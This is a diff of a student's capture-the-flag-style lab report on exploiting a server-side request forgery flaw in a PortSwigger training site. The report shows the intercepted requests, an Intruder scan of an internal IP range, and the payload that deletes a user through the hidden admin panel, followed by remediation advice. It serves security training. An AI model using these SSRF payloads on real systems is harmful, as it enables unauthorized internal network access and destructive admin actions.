@@ -3,68 +3,67 @@
 
 
 **Report ID:** PS-LAB-SSRF-002  
-
 **Author:** Abhi (Abhiram)  
-
 **Date:** February 13, 2026  
-
 **Lab Level:** Apprentice  
-
 **Lab Title:** Basic SSRF against another back-end system
 
 
 
-## Executive Summary:
+
+## Executive Summary
 
 **Vulnerability Type:** Server-Side Request Forgery (SSRF) – Basic / Internal Network Access  
 
 **Severity:** High (CVSS 3.1 Score: 8.6 – AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N – unauthorized internal access)
 
-**Description:** A Server-Side Request Forgery vulnerability exists in the stock check functionality. The application fetches data from a user-controlled URL (`stockApi` parameter) without validation, allowing the server to make arbitrary requests to internal back-end systems. Exploitation involves scanning the internal `192.168.0.X` range (port 8080) to locate an admin interface, accessing it, and deleting the user `carlos`.
+**Description:**  
+A Server-Side Request Forgery vulnerability exists in the stock check functionality. The application fetches data from a user-controlled URL (`stockApi` parameter) without validation, allowing the server to make arbitrary requests to internal back-end systems. Exploitation involves scanning the internal `192.168.0.X` range (port 8080) to locate an admin interface, accessing it, and deleting the user `carlos`.
 
-**Impact:** Unauthorized access to internal networks, admin panels, or other back-end services not exposed publicly. In production, this could lead to data exfiltration, configuration leaks, or chained attacks (e.g., metadata theft).
+**Impact:**  
+Unauthorized access to internal networks, admin panels, or other back-end services not exposed publicly. In production, this could lead to data exfiltration, configuration leaks, or chained attacks (e.g., metadata theft).
 
 **Status:** Exploited in controlled lab environment only; no real-world impact. Educational purposes.
 
 
 
-## Environment and Tools Used:
 
-**Target:** Simulated e-commerce site from PortSwigger Web Security Academy (e.g., `https://*.web-security-academy.net`)  
+## Environment and Tools Used
 
-**Browser:** Google Chrome (Version 120.0 or similar)  
-
-**Tools:** Burp Suite Community Edition (Version 2023.12 or similar) – Proxy interception, Repeater, Intruder for IP scanning  
-
-**Operating System:** Windows 11  
-
-**Test Date/Time:** February 13, 2026, approximately 10:44 AM IST
+- **Target:** Simulated e-commerce site from PortSwigger Web Security Academy (`https://*.web-security-academy.net`)
+- **Browser:** Google Chrome (Version 120.0 or similar)
+- **Tools:** Burp Suite Community Edition (Version 2023.12 or similar) – Proxy, Repeater, Intruder
+- **Operating System:** Windows 11
+- **Test Date/Time:** February 13, 2026, approximately 10:44 AM IST
 
 
 
-## Methodology:
+
+## Methodology
 
 Conducted following ethical hacking best practices in a simulated environment.
 
-1. Accessed the lab via "Access the lab" in PortSwigger Academy.  
-2. Selected a product → clicked "Check stock" → intercepted POST request to `/product/stock` in Burp Proxy.  
-3. Sent request to Burp Repeater to confirm SSRF (response reflects fetched content).  
-4. Sent to Burp Intruder:  
-   - Highlighted the last octet of IP in `stockApi=http://192.168.0.1:8080/admin` → added as §payload§.  
-   - Payloads tab: Numbers type → From 1 to 255, step 1.  
-   - Started attack → looked for status 200 (successful response).  
-5. Identified admin IP (e.g., `192.168.0.XX:8080/admin`) from successful response.  
-6. Modified `stockApi` to `http://192.168.0.XX:8080/admin/delete?username=carlos` → sent → user deleted.  
+1. Accessed the lab via "Access the lab" in PortSwigger Academy.
+2. Selected a product → clicked **Check stock** → intercepted POST request to `/product/stock` in Burp Proxy.
+3. Sent request to Burp Repeater to confirm SSRF (response reflects fetched content).
+4. Sent to Burp Intruder:
+   - Highlighted the last octet of IP in `stockApi=http://192.168.0.1:8080/admin` → added as `§payload§`.
+   - Payloads: Numbers → From 1 to 255, step 1.
+   - Started attack → looked for status **200**.
+5. Identified admin IP (e.g., `192.168.0.XX:8080/admin`) from successful response.
+6. Modified `stockApi` to `http://192.168.0.XX:8080/admin/delete?username=carlos` → sent → user deleted.
 7. Lab solved (green banner: "Congratulations, you solved the lab!").
 
 
 
-## Detailed Findings:
 
-**Vulnerable Endpoint:** POST `/product/stock` (stock check)
+## Detailed Findings
 
-**Original Request (Captured in Burp):**
+**Vulnerable Endpoint:** `POST /product/stock` (stock check)
 
+### Original Request (Captured in Burp)
+
+```http
 POST /product/stock HTTP/2
 Host: 0ae3002803aef186809c354400340003.web-security-academy.net
 Cookie: session=Q9n7eU2KT6zIgGFFzQs5LPmsQz57swIL
@@ -73,8 +72,7 @@ Content-Type: application/x-www-form-urlencoded
 stockApi=http://192.168.0.64:8080/admin
 
 
-
-**Reflected Output:**
+Reflected Output (Admin Panel via SSRF):
 
 HTTP/2 200 OK
 Content-Type: text/html; charset=utf-8
@@ -86,8 +84,6 @@ Content-Length: 3243
     <title>Basic SSRF against another back-end system</title>
 </head>
 <body>
-    <!-- Lab header: "Not solved" status -->
-    
     <!-- Admin panel shows SSRF'd backend: -->
     <h1>Users</h1>
     <div>wiener - <a href="/http://192.168.0.64:8080/admin/delete?username=wiener">Delete</a></div>
@@ -96,8 +92,7 @@ Content-Length: 3243
 </html>
 
 
-
-Modified request 1:
+Modified Request (Delete User carlos):
 
 POST /product/stock HTTP/2
 Host: 0ae3002803aef186809c354400340003.web-security-academy.net
@@ -109,25 +104,20 @@ stockApi=http://192.168.0.64:8080/admin/delete?username=carlos
 
 
 Response:
-
 HTTP/2 200 OK
 Content-Type: text/html; charset=utf-8
 
-<!DOCTYPE html>
-<!-- Lab header: "SOLVED" status -->
-<p>User deleted successfully!</p>
-<h1>Users</h1>
-<div>wiener - <a href="/admin/delete?username=wiener">Delete</a></div>
-<!-- Carlos account removed 
+User deleted successfully!
 
 
 
-Proof of Exploitation:
+Proof of Exploitation
 
 
 ![Proof of SSRF Error]()
 
-Figure 1: Burp Intruder scan showing status 200 on valid IP (admin found).
+Figure 1: Burp Intruder scan showing status 200 on valid IP (admin interface found).
+
 
 
 ![Proof of Successful SSRF Exploitation]()
@@ -135,9 +125,11 @@ Figure 1: Burp Intruder scan showing status 200 on valid IP (admin found).
 Figure 2: Successful deletion of user 'carlos'.
 
 
+
 ![Lab Solved Congratulations]()
 
 Figure 3: PortSwigger Academy confirmation – "Congratulations, you solved the lab!"
+
 
 
 
@@ -147,11 +139,13 @@ The application trusts the stockApi URL and fetches it server-side, returning th
 
 
 
+
 Risk Assessment:
 
-Likelihood: High (user-controlled URL, no validation).
-Impact: High to Critical — internal network scanning, unauthorized access, potential exfiltration or escalation.
-Affected Components: Stock check backend fetch logic.
+Likelihood: High (user-controlled URL, no validation)
+Impact: High to Critical — internal network scanning, unauthorized access, potential exfiltration or escalation
+Affected Components: Stock check backend fetch logic
+
 
 
 
@@ -159,27 +153,29 @@ Recommendations for Remediation:
 
 Validate URLs strictly (allowlist trusted external domains only).
 Block private/internal IPs (RFC 1918: 192.168.x.x, 10.x.x.x, 172.16–31.x.x; localhost; metadata endpoints).
-Use network segmentation / firewall rules to prevent app from accessing internal resources.
+Use network segmentation / firewall rules to prevent the app from accessing internal resources.
 Sanitize/avoid returning full backend responses to clients.
 Deploy WAF with SSRF detection rules.
 Regular scanning (Burp Scanner, ZAP) and code reviews.
 
 
 
+
 Conclusion and Lessons Learned:
 
-This lab showed basic SSRF against internal back-end systems: scan private IP ranges via Intruder, access hidden admin, perform actions.
+This lab demonstrated basic SSRF against internal back-end systems: scan private IP ranges via Intruder, access hidden admin panels, and perform privileged actions.
 
 Key Takeaways:
 
-SSRF often in "fetch from URL" features (stock checks, imports, webhooks).
-Test private IPs (192.168.0.1–255, 10.0.0.1, etc.) and ports (8080 common).
-Intruder excels for IP brute-forcing in SSRF.
+SSRF often appears in "fetch from URL" features (stock checks, imports, webhooks).
+Always test private IPs (192.168.0.1–255, 10.0.0.1, etc.) and common ports (8080).
+Burp Intruder is excellent for IP brute-forcing in SSRF scenarios.
 Strengthened skills in SSRF detection, scanning, and exploitation.
+
 
 
 
 References:
 
 PortSwigger Academy: Basic SSRF against another back-end system
-General: Server-side request forgery (SSRF)
+OWASP: Server-Side Request Forgery (SSRF)
